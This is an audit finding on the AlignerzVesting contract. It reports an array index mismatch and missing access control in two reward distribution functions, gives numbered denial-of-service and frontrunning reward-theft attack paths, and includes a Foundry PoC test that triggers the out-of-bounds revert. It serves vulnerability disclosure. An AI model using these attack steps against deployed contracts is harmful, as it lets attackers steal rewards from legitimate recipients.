# [000655] HIGH Array Index Mismatch and Missing Access Control in `distributeRewardTVS` and `distributeStablecoinAllocation` Enable DoS and Reward Theft
  
  ### Summary

The index mismatch between storage array length and caller-supplied array in `distributeRewardTVS` and `distributeStablecoinAllocation`, combined with missing access control, will cause a complete denial-of-service for bulk reward distribution and allow reward theft for legitimate KOL recipients as any attacker will frontrun the owner and call these functions with a malicious address array to redirect unclaimed rewards to attacker-controlled addresses.


### Root Cause

 `distributeRewardTVS` function uses `rewardProject.kolTVSAddresses.length` as the loop bound but indexes into the caller-supplied `kol` array parameter, creating an index mismatch. Additionally, the function lacks the `onlyOwner` modifier present in the similar `distributeRemainingRewardTVS` function.

https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/vesting/AlignerzVesting.sol#L525C3-L533C14

```solidity
function distributeRewardTVS(uint256 rewardProjectId, address[] calldata kol) external {
    RewardProject storage rewardProject = rewardProjects[rewardProjectId];
    require(block.timestamp > rewardProject.claimDeadline, Deadline_Has_Not_Passed());
    uint256 len = rewardProject.kolTVSAddresses.length;  // ← uses storage length
    for (uint256 i; i < len;) {
        _claimRewardTVS(rewardProjectId, kol[i]);        // ← accesses calldata array
        unchecked { ++i; }
    }
}
```

The same vulnerability exists in `distributeStablecoinAllocation` with identical root cause.


### Internal Pre-conditions

1. Protocol owner needs to call `launchRewardProject()` to create a reward project
2. Protocol owner needs to call `setTVSAllocation()` to allocate TVS rewards to N KOL addresses, populating `rewardProject.kolTVSAddresses` with N entries
3. Time needs to progress past `rewardProject.claimDeadline` to allow distribution functions to be called


### External Pre-conditions

none

### Attack Path

**DoS Scenario:**
1. Any user calls `distributeRewardTVS(rewardProjectId, kolArray)` where `kolArray.length < kolTVSAddresses.length`
2. The function enters the loop with `len = kolTVSAddresses.length`
3. When loop counter `i` reaches `kolArray.length`, the access `kol[i]` triggers an out-of-bounds panic (0x32)
4. The transaction reverts, making bulk distribution permanently unusable for this reward project

**Reward Theft Scenario:**
1. Attacker monitors the mempool for the owner's legitimate `distributeRewardTVS` call
2. Attacker frontruns with their own call to `distributeRewardTVS(rewardProjectId, maliciousArray)` where:
   - `maliciousArray.length >= kolTVSAddresses.length` to avoid out-of-bounds revert
   - `maliciousArray` contains attacker-controlled addresses instead of legitimate KOL addresses
3. The function executes with `len = kolTVSAddresses.length` but calls `_claimRewardTVS(rewardProjectId, maliciousArray[i])` for each iteration
4. `_claimRewardTVS` mints NFTs to the addresses in `maliciousArray` and removes entries from `kolTVSAddresses` via swap-and-pop
5. Attacker receives TVS NFTs with vested token allocations intended for legitimate KOLs
6. When the owner's legitimate transaction processes, it attempts to distribute already-claimed rewards and reverts


### Impact

**DoS Impact:** The protocol suffers complete inability to perform bulk reward distribution for any reward project where `distributeRewardTVS` or `distributeStablecoinAllocation` is called with an array shorter than the storage array length. This forces manual single-address claiming via `claimRewardTVS`, significantly increasing gas costs and operational complexity.

**Theft Impact:** Legitimate KOL recipients suffer a 100% loss of their allocated TVS or stablecoin rewards. The attacker gains the full value of all unclaimed rewards in the project by receiving minted NFTs with vesting schedules that should belong to legitimate KOLs. For a typical reward project with 10 KOLs allocated 1000 tokens each, the attacker gains 10,000 tokens at the expense of legitimate recipients.


### PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";
import {Aligners26} from "../src/contracts/token/Aligners26.sol";
import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";
import {Upgrades} from "openzeppelin-foundry-upgrades/Upgrades.sol";
import {CompleteMerkle} from "murky/src/CompleteMerkle.sol";
import {A26ZDividendDistributor} from "../src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol";


contract A26ZDividendDistributorHarness is A26ZDividendDistributor {
    constructor(
        address _vesting,
        address _nft,
        address _stablecoin,
        uint256 _startTime,
        uint256 _vestingPeriod,
        address _token
    )
        A26ZDividendDistributor(
            _vesting,
            _nft,
            _stablecoin,
            _startTime,
            _vestingPeriod,
            _token
        )
    {}

    // Test-only helper to seed accounting for a given NFT id
    function seedAccounting(
        uint256 nftId,
        uint256 unclaimedForNft,
        uint256 _totalUnclaimed,
        uint256 _stablecoinToDistribute
    ) external {
        unclaimedAmountsIn[nftId] = unclaimedForNft;
        totalUnclaimedAmounts = _totalUnclaimed;
        stablecoinAmountToDistribute = _stablecoinToDistribute;
    }
}


contract AlignerzVestingProtocolTest is Test {
    AlignerzVesting public vesting;
    Aligners26 public token;
    AlignerzNFT public nft;
    MockUSD public usdt;
    A26ZDividendDistributor public distributor;

    address public owner;
    address public projectCreator;
    address[] public bidders;

    // Constants
    uint256 constant NUM_BIDDERS = 20;
    uint256 constant TOKEN_AMOUNT = 26_000_000 ether;
    uint256 constant BIDDER_USD = 1_000 ether;
    uint256 constant PROJECT_ID = 0;

    // Project structure for organization
    struct BidInfo {
        address bidder;
        uint256 amount;
        uint256 vestingPeriod;
        uint256 poolId;
        bool accepted;
    }

    // Track allocated bids and their proofs
    mapping(address => bytes32[]) public bidderProofs;
    mapping(address => uint256) public bidderPoolIds;
    mapping(address => uint256) public bidderNFTIds;
    bytes32 public refundRoot;

    function setUp() public {
        owner = address(this);
        projectCreator = makeAddr("projectCreator");
        vm.deal(projectCreator, 100 ether);

        // Deploy contracts
        usdt = new MockUSD();
        token = new Aligners26("26Aligners", "A26Z");
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");

        address payable proxy = payable(Upgrades.deployUUPSProxy(
            "AlignerzVesting.sol",
            abi.encodeCall(AlignerzVesting.initialize, (address(nft))))
        );
        vesting = AlignerzVesting(proxy);

        // Set NFT minter to vesting contract
        vm.prank(owner);
        nft.addMinter(proxy);
        vesting.setTreasury(address(1));

        // Create bidders with ETH and USDT
        for (uint256 i = 0; i < NUM_BIDDERS; i++) {
            address bidder = makeAddr(string.concat("bidder", vm.toString(i)));
            vm.deal(bidder, 50 ether);
            bidders.push(bidder);
            usdt.mint(bidder, BIDDER_USD);
        }

        // Mint tokens for project creator
        token.transfer(projectCreator, TOKEN_AMOUNT);
        vesting.transferOwnership(projectCreator);

        // Approve tokens for vesting contract
        vm.prank(projectCreator);
        token.approve(address(vesting), TOKEN_AMOUNT);
    }

    // Helper function to create a leaf node for the merkle tree
    function getLeaf(address bidder, uint256 amount, uint256 projectId, uint256 poolId)
        internal
        pure
        returns (bytes32)
    {
        return keccak256(abi.encodePacked(bidder, amount, projectId, poolId));
    }

    // Helper for generating merkle proofs
    function generateMerkleProofs(BidInfo[] memory bids, uint256 poolId) internal returns (bytes32) {
        bytes32[] memory leaves = new bytes32[](bids.length);
        uint256 leafCount = 0;

        // Create leaves for each bid in this pool
        for (uint256 i = 0; i < bids.length; i++) {
            if (bids[i].poolId == poolId && bids[i].accepted) {
                leaves[leafCount] = getLeaf(bids[i].bidder, bids[i].amount, PROJECT_ID, poolId);

                bidderPoolIds[bids[i].bidder] = poolId;
                leafCount++;
            }
        }

        CompleteMerkle m = new CompleteMerkle();
        bytes32 root = m.getRoot(leaves);
        uint256 indexTracker = 0;
        for (uint256 i = 0; i < bids.length; i++) {
            if (bids[i].poolId == poolId && bids[i].accepted) {
                bytes32[] memory proof = m.getProof(leaves, indexTracker);
                bidderProofs[bids[i].bidder] = proof;
                indexTracker++;
            }
        }

        return root;
    }

    // Helper for generating refund proofs
    function generateRefundProofs(BidInfo[] memory bids) internal returns (bytes32) {
        bytes32[] memory leaves = new bytes32[](bids.length);
        uint256 leafCount = 0;
        uint256 poolId = 0;

        // Create leaves for each bid in this pool
        for (uint256 i = 0; i < bids.length; i++) {
            if (!bids[i].accepted) {
                leaves[leafCount] = getLeaf(bids[i].bidder, bids[i].amount, PROJECT_ID, poolId);

                bidderPoolIds[bids[i].bidder] = poolId;
                leafCount++;
            }
        }

        CompleteMerkle m = new CompleteMerkle();
        bytes32 root = m.getRoot(leaves);
        uint256 indexTracker = 0;
        for (uint256 i = 0; i < bids.length; i++) {
            if (!bids[i].accepted) {
                bytes32[] memory proof = m.getProof(leaves, indexTracker);
                bidderProofs[bids[i].bidder] = proof;
                indexTracker++;
            }
        }

        return root;
    }



  

    function test_DistributeRewardTVS_DoS_WhenArrayLengthMismatch() public {
        // -----------------------------
        // 1. Setup: reward project with 3 KOLs
        // -----------------------------
        vm.startPrank(projectCreator);

        // rewardProjectId is the current rewardProjectCount before creation
        uint256 rewardProjectId = vesting.rewardProjectCount();

        uint256 startTime = block.timestamp;
        uint256 claimWindow = 1 days;
        uint256 vestingPeriod = 180 days;

        // Launch reward project: (tokenAddress, stablecoinAddress, startTime, claimWindow)
        vesting.launchRewardProject(
            address(token),
            address(usdt),
            startTime,
            claimWindow
        );

        // Prepare 3 KOLs and their TVS allocations
        address[] memory kolTVS = new address[](3);
        kolTVS[0] = bidders[0];
        kolTVS[1] = bidders[1];
        kolTVS[2] = bidders[2];

        uint256[] memory TVSamounts = new uint256[](3);
        TVSamounts[0] = 1_000 ether;
        TVSamounts[1] = 2_000 ether;
        TVSamounts[2] = 3_000 ether;
        uint256 totalTVSAllocation = 1_000 ether + 2_000 ether + 3_000 ether;

        // Approve vesting to pull TVS for the reward project
        token.approve(address(vesting), totalTVSAllocation);

        // setTVSAllocation(rewardProjectId, totalTVSAllocation, vestingPeriod, kolTVS, TVSamounts)
        vesting.setTVSAllocation(
            rewardProjectId,
            totalTVSAllocation,
            vestingPeriod,
            kolTVS,
            TVSamounts
        );

        vm.stopPrank();

        // Fast forward past claim deadline so distributeRewardTVS is allowed
        vm.warp(startTime + claimWindow + 1);

        // -----------------------------
        // 2. DoS scenario: kol.length < kolTVSAddresses.length
        // -----------------------------
        // Storage has 3 KOLs, but caller only supplies 2 entries.
        address[] memory shortKolArray = new address[](2);
        shortKolArray[0] = bidders[0];
        shortKolArray[1] = bidders[1];

        // distributeRewardTVS uses:
        //   uint256 len = rewardProject.kolTVSAddresses.length; // = 3
        //   _claimRewardTVS(rewardProjectId, kol[i]);            // kol[2] out-of-bounds
        vm.expectRevert(); // panic 0x32: array out-of-bounds on kol[2]
        vesting.distributeRewardTVS(rewardProjectId, shortKolArray);
    }



    function test_CompleteVestingFlow() public {
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);

        // 1. Launch project
        vm.startPrank(projectCreator);
        vesting.launchBiddingProject(address(token), address(usdt), block.timestamp, block.timestamp + 1_000_000, "0x0", true);

        // 2. Create multiple pools with different prices
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
        vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.02 ether, false);
        vesting.createPool(PROJECT_ID, 4_000_000 ether, 0.03 ether, false);

        // 3. Place bids from different whitelisted users
        vesting.addUsersToWhitelist(bidders, PROJECT_ID);
        vm.stopPrank();
        for (uint256 i = 0; i < NUM_BIDDERS; i++) {
            vm.startPrank(bidders[i]);

            // Approve and place bid
            usdt.approve(address(vesting), BIDDER_USD);

            // Different vesting periods to test variety
            uint256 vestingPeriod = (i % 3 == 0) ? 90 days : (i % 3 == 1) ? 180 days : 365 days;

            vesting.placeBid(PROJECT_ID, BIDDER_USD, vestingPeriod);
            vm.stopPrank();
        }

        // 4. Update some bids
        vm.prank(bidders[0]);
        vesting.updateBid(PROJECT_ID, BIDDER_USD, 180 days);

        // 5. Prepare bid allocations (this would be done off-chain)
        BidInfo[] memory allBids = new BidInfo[](NUM_BIDDERS);

        // Simulate off-chain allocation process
        for (uint256 i = 0; i < NUM_BIDDERS; i++) {
            // Assign bids to pools (in reality, this would be based on some algorithm)
            uint256 poolId = i % 3;
            bool accepted = i < 15; // First 15 bidders are accepted

            allBids[i] = BidInfo({
                bidder: bidders[i],
                amount: BIDDER_USD, // For simplicity, all bids are the same amount
                vestingPeriod: (i % 3 == 0) ? 90 days : (i % 3 == 1) ? 180 days : 365 days,
                poolId: poolId,
                accepted: accepted
            });
        }

        // 6. Generate merkle roots for each pool
        bytes32[] memory poolRoots = new bytes32[](3);
        for (uint256 poolId = 0; poolId < 3; poolId++) {
            poolRoots[poolId] = generateMerkleProofs(allBids, poolId);
        }

        // 7. Generate refund proofs
        refundRoot = generateRefundProofs(allBids);

        // 8. Finalize project with merkle roots
        vm.prank(projectCreator);
        vesting.finalizeBids(PROJECT_ID, refundRoot, poolRoots, 60);
        uint256[] memory nftIds = new uint256[](15);
        // 9. Users claim NFTs with proofs
        for (uint256 i = 0; i < 15; i++) {
            // Only accepted bidders
            address bidder = bidders[i];
            uint256 poolId = bidderPoolIds[bidder];

            vm.prank(bidder);
            uint256 nftId = vesting.claimNFT(PROJECT_ID, poolId, BIDDER_USD, bidderProofs[bidder]);
            nftIds[i] = nftId;
            vm.prank(bidder);
            //(uint256 oldNft, uint256 newNft) = vesting.splitTVS(PROJECT_ID, nftId, 5000);
            //assertEq(oldNft, nftId);
            bidderNFTIds[bidder] = nftId;

            // Verify NFT ownership
            assertEq(nft.ownerOf(nftId), bidder);
        }

        // 10. Some users try to claim refunds
        for (uint256 i = 15; i < NUM_BIDDERS; i++) {
            // Only Refunded bidders
            address bidder = bidders[i];
            vm.prank(bidder);
            vesting.claimRefund(PROJECT_ID, BIDDER_USD, bidderProofs[bidder]);

            // Verify USDT was returned
            assertEq(usdt.balanceOf(bidders[i]), BIDDER_USD);
        }

        // 11. Fast forward time to simulate vesting period
        vm.warp(block.timestamp + 60 days);

        // 12. Users claim tokens after vesting period
        for (uint256 i = 0; i < 15; i++) {
            address bidder = bidders[i];
            //uint256 nftId = bidderNFTIds[bidder];

            uint256 tokenBalanceBefore = token.balanceOf(bidder);

            vm.prank(bidder);
            vesting.claimTokens(PROJECT_ID, nftIds[i]);

            uint256 tokenBalanceAfter = token.balanceOf(bidder);
            assertTrue(tokenBalanceAfter > tokenBalanceBefore, "No tokens claimed");
        }

        // 13. Fast forward more time to simulate complete vesting
        vm.warp(block.timestamp + 365 days);

        // 14. Users claim remaining tokens
        for (uint256 i = 0; i < 15; i++) {
            address bidder = bidders[i];
            uint256 nftId = bidderNFTIds[bidder];

            // Skip if NFT was already burned due to full claim
            if (nftId == 0) continue;

            try nft.ownerOf(nftId) returns (address ownerOf) {
                if (ownerOf == bidder) {
                    vm.prank(bidder);
                    vesting.claimTokens(PROJECT_ID, nftId);
                }
            } catch {
                // NFT was already burned, which means tokens were fully claimed
            }
        }

        // 15. Update project allocations (optional test)
        bytes32[] memory newPoolRoots = new bytes32[](3);
        for (uint256 i = 0; i < 3; i++) {
            newPoolRoots[i] = keccak256(abi.encodePacked("new_pool_root", i));
        }

        vm.prank(projectCreator);
        vesting.updateProjectAllocations(PROJECT_ID, keccak256(abi.encodePacked("new_refund_root")), newPoolRoots);
    }

    function test_MultipleProjectsFlow() public {
        vm.startPrank(projectCreator);
        vesting.setVestingPeriodDivisor(1);
        // Similar to the complete flow but with multiple projects
        // This demonstrates the contract's ability to handle multiple projects simultaneously

        // Setup first project
        vm.startPrank(projectCreator);
        vesting.launchBiddingProject(address(token), address(usdt), block.timestamp, block.timestamp + 1_000_000, "0x0", true);
        vesting.createPool(0, 3_000_000 ether, 0.01 ether, true);
        vesting.addUsersToWhitelist(bidders, 0);
        vm.stopPrank();

        // Setup second project
        vm.startPrank(projectCreator);
        vesting.launchBiddingProject(address(token), address(usdt), block.timestamp + 100, block.timestamp + 1_100_000, "0x0", true);
        vesting.createPool(1, 3_000_000 ether, 0.015 ether, false);
        vesting.addUsersToWhitelist(bidders, 1);
        vm.stopPrank();

        vm.warp(block.timestamp + 100);
        // Place bids for both projects
        for (uint256 i = 0; i < 10; i++) {
            vm.startPrank(bidders[i]);
            usdt.approve(address(vesting), BIDDER_USD);
            vesting.placeBid(0, BIDDER_USD / 2, 90 days);
            vm.stopPrank();

            vm.startPrank(bidders[i + 10]);
            usdt.approve(address(vesting), BIDDER_USD);
            vesting.placeBid(1, BIDDER_USD / 2, 180 days);
            vm.stopPrank();
        }

        // Simplified allocation for both projects
        bytes32[] memory poolRootsProject0 = new bytes32[](1);
        poolRootsProject0[0] = keccak256(abi.encodePacked("project0_pool0"));

        bytes32[] memory poolRootsProject1 = new bytes32[](1);
        poolRootsProject1[0] = keccak256(abi.encodePacked("project1_pool0"));

        // Finalize both projects
        vm.startPrank(projectCreator);
        vesting.finalizeBids(0, bytes32(0), poolRootsProject0, 60);
        vesting.finalizeBids(1, bytes32(0), poolRootsProject1, 60);
        vm.stopPrank();
    }
}
```

run forge test --ffi --force --mt test_DistributeRewardTVS_DoS_WhenArrayLengthMismatch -vvvv

### Mitigation

_No response_
  